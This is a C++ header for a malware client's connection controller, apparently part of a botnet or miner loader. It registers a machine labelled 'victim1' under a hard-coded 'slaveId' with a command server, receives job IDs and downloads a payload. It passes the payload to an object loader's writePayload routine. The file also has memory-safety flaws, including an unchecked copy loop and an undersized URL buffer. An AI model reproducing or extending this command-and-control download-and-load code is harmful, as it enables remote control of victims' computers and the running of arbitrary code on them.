
#include "stdafx.h"
#include "HttpRequest.hpp"
#include "JSONParser.h"
#include "URLs.h"
#include "ServerResponse.h"
#include "ObjectLoader.h"

using namespace std;

#ifndef CONNECTION_CONTROLLER_H
#define CONNECTION_CONTROLLER_H

class ConnectionController {
private: 
    const string slaveId = "e1896e80-c325-11ed-b033-f5252f300cca";
    string computername, username, computerinfo;
    string jobId = "NO_JOBS";
    int objectSize = 0;

    json::JSON httpPOST(const char* URL, const char* body) {

        http::Request requestPOST{URL};
        const auto response = requestPOST.send("POST", body, {
            {"Content-Type", "application/json"}
        });
        return json::parse(string{response.body.begin(), response.body.end()});
    }

    json::JSON httpGET(const char* URL) {

        http::Request requestGET(URL);
        const auto response = requestGET.send("GET");
        return json:: parse(string{response.body.begin(), response.body.end()});
    }

    unsigned char* downloadFile(const char* URL, size_t size) {
        
        unsigned char* file = new unsigned char[size];
        
        http::Request requestGET(URL);
        const auto response = requestGET.send("GET");
        printf("Size response: %ld\n", response.body.size());
        printf("Size request: %ld\n", size);
        
        for (int i = 0; i < response.body.size(); i++) {
            file[i] = response.body.at(i);
        }
        
        return file;
    }

    const char* prepareInitBody() {

        // const char* templateStr = "{\"username\":\"%s\", \"computername\":\"%s\", \"info\":\"%s\", \"slaveId\":\"%s\"}";

        // int strSize = strlen(templateStr) + this->computerinfo.length() + 
        //     this->username.length() + this->computername.length();
            
        // printf("String size: %d\n", strSize);
            
        // char *body = new char[strSize];
        // snprintf(body, strSize, templateStr, this->username.c_str(), 
        //     this->computername.c_str(), this->computerinfo.c_str(), this->slaveId.c_str());


        return "{\"username\":\"victim1\", \"computername\":\"miner\", \"info\":\"LINUX\", \"slaveId\":\"e1896e80-c325-11ed-b033-f5252f300cca\"}";

    }

public:
    ConnectionController() {
        
    }

    // Sets important variables.
    void prepareConnection(string computername, string username, string computerinfo) {
        this->computerinfo = computerinfo;
        this->username = username;
        this->computername = computername;
    }

    // Sends the init request.
    int initConnection() {

        json::JSON responseBody = httpPOST(URL_INIT, prepareInitBody());
        if (responseBody.size() <= 0) {
            return RESPONSE_ERROR; // No response from server.
        }

        int code = json::getInt("code", responseBody);
        if (code == RESPONSE_NEW_OBJECT) {

            this->jobId = json::getStr("id", responseBody);
            this->objectSize = json::getInt("size", responseBody);
        }

        return code;
    }

    // Ping server for status updates or new objects.
    int ping() {
        return 0;
    }

    // Get job.
    bool getNewJob(ObjectLoader *loader) {

        if (this->jobId.length() == 0 || this->objectSize <= 0) {
            printf("No job currently!\n");
            return false;
        }

        if (!loader->reserveSpace(this->objectSize)) {
            printf("Couldn't reserve space for job!\n");
            return false;
        }

        // Create URL with jobID.
        char* urlJob = new char[this->jobId.length() + strlen(URL_JOB)];
        snprintf(urlJob, this->jobId.length() + strlen(URL_JOB), URL_JOB, this->jobId.c_str());
        printf("JOB URL: %s\n", urlJob);

        // Download the file.
        unsigned char* file = downloadFile(urlJob, this->objectSize);
        bool success = loader->writePayload(file, this->objectSize);

        // Clear values.
        this->objectSize = 0;
        this->jobId = "NO_JOB";

        return success;
    }
};

#endif // !~ CONNECTION_CONTROLLER_H